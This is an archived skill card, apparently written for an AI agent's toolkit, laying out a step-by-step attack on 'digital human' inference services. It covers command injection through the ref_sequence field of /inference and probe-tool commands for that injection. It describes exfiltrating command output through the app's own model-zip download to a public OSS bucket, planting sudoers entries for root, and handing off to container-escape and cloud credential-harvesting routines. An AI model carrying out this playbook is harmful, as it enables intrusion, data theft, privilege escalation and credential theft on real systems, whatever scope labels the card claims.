<!-- archived from /root/.hermes/skills/security/digitalhuman-inference-rce/SKILL.md on 2026-10-21 -->

---
name: digitalhuman-inference-rce
description: >-
  数字人 / Img2Avatar / FancyTalk / MimicTalk 推理管道：
  POST /inference 的 ref_sequence 落在 bash 双引号内，反引号/$() 可 RCE，
  ;id 常假阴。回传优先走应用自有 /download_model_zip → 公开 OSS，
  目标不必出网。触发：数字人素材、ref_sequence、download_model_zip、
  fancy-digitalhuman、Img2Avatar、MimicTalk、vlm_avatar_node。
  通用 ;id 命令注入不走这张。
---

> 归档卡：原目录 `/root/.hermes/skills/security/digitalhuman-inference-rce`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/digitalhuman-inference-rce/…')`，不要相对 `references/legacy/` 解析。

# 数字人推理管道 RCE

目标须在 `config/scope*.json`。授权内默认打到 **L2**：OSS zip 的 `out.txt` 出现 `se9359`。  
`;id` 阴、HTTP `quote` 全阴都不算结案。L3 出 `uid=`。第一跳不要 `--sudo-n`。  
先问只剩：覆盖生产桶、改原超管密、清盘。

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | `/inference` + `ref_sequence` / `download_model_zip` / FancyTalk | 只看到 Flask |
| L2 | OSS `out.txt` 有 `se9359` | 只打了分号 / 只看了 HTTP |
| L3 | zip 里 `uid=`；`--sudo-n` 后 `uid=0` 才是 root 通道 | 只触发了 zip |

## 立刻跑

```bash
python3 tools/ops/digitalhuman_inference_probe.py surface --base http://授权:5001 --case <案>
python3 tools/ops/digitalhuman_inference_probe.py quote --base http://授权:5001 --case <案>
python3 tools/ops/digitalhuman_inference_probe.py oob --base http://授权:5001 \
  --oss https://桶.oss-cn-hangzhou.aliyuncs.com/models --case <案>
python3 tools/ops/digitalhuman_inference_probe.py exec --base http://授权:5001 \
  --oss https://桶.oss-cn-hangzhou.aliyuncs.com/models --case <案>
```

产物：`测绘/digitalhuman/{surface,quote,oob,exec}.json`。

## 六步

```text
① 认 /inference multipart 与 download_model_zip
② 用最小合法 wav，不要空 audio
③ quote 认双引号上下文；HTTP 全阴是预期，不准结案
④ oob：双层 base64 写 out.txt → zip → 拉 桶/models/<目录名>.zip（等 3 秒）
⑤ 第一跳不加 --sudo-n；种完 sudoers 再开。公网 :5001 是隧道口
⑥ docker 组 + 盘满 → 容器逃逸卡；IR 查 99-qx / qxroot -p / ops-quantum
```

## 交接

| 认到 | 走 |
|------|----|
| 普通 cmdi，不是推理管道 | `command-injection-testing` |
| 目标出网的 DNS/HTTP 外带 | `oob-exfil-kit` |
| docker / lxd 组 | `容器逃逸手法.md` · `linux_lpe_checker.py` |
| OSS / LTAI / DashScope | `credential-harvest` |
| 未认形抢 RCE | `rce-encyclopedia` |
| 已 root 排后门 | `host-ir-check` |

## 真源

- 手法：`docs/playbooks/数字人推理管道命令注入与OSS回传手法.md`
- 探针：`tools/ops/digitalhuman_inference_probe.py`
